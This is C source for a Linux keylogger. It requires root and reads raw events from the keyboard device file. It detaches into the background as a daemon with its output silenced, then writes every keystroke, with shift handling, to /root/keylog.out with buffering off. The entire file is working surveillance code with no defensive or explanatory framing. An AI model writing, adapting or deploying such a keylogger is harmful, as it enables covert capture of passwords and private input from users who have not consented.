#include <assert.h>      // assert()
#include <errno.h>       // strerror()
#include <linux/input.h> // Record Keyboard events
#include <stdint.h>      // Reduce size of predefined datatypes
#include <stdio.h>       // Input/Output Operations & File Handling
#include <stdlib.h>      // exit()
#include <string.h>      // strcmp()
#include <unistd.h>      // daemon()

#include "include/util.h"

/*
Structure predefined in linux/input.h
struct input_event
{
  struct timeval time; Time of occurence of event
  __u16 type;          Type of event occured (EV_KEY, EV_REL)
  __u16 code;          Code for each event occured (Key Codes)
  __s32 value;         Value of event occured (Keypress 1; Keyrelease 0)
};
*/
typedef struct input_event input_event;

int main() {
    check_root_user();

    const char *logFile = "/root/keylog.out";

    FILE *kbd_fd = open_keyboard_device_file(get_keyboard_device_file());
    assert(kbd_fd != NULL);

    FILE *logfile_fd = open_log_file(logFile);
    assert(logfile_fd != NULL);

    // We want to write to the file on every keypress, so disable buffering
    setbuf(logfile_fd, NULL);

    /*
    Daemonize process (Run the process in background).
    Don't change working directory (1) but redirect standard outputs to /dev/null (0)
    */
    if (daemon(1, 0) == -1) {
        printf("%s", strerror(errno));
        exit(-1);
    }

    uint8_t shift_pressed = 0;
    input_event event;

    while (fread(&event, sizeof(input_event), 1, kbd_fd) > 0) {
        if (event.type == EV_KEY) {
            if (event.value == KEY_PRESS) {
                if (IS_SHIFT(event.code)) {
                    shift_pressed++;
                }

                const char *name = get_key_stroke(event.code, shift_pressed);
                if (strcmp(name, "<Enter>") == 0 || strcmp(name, "<KPEnter>") == 0) {
                    fprintf(logfile_fd, "\n%s", name);
                } else if (strcmp(name, UNKNOWN_KEY) != 0) {
                    fprintf(logfile_fd, "%s", name);
                }

            } else if (event.value == KEY_RELEASE) {
                if (IS_SHIFT(event.code)) {
                    shift_pressed--;
                }
            }
        }
        assert(shift_pressed >= 0 && shift_pressed <= 2);
    }

    fclose(logfile_fd);
    fclose(kbd_fd);
    return 0;
}
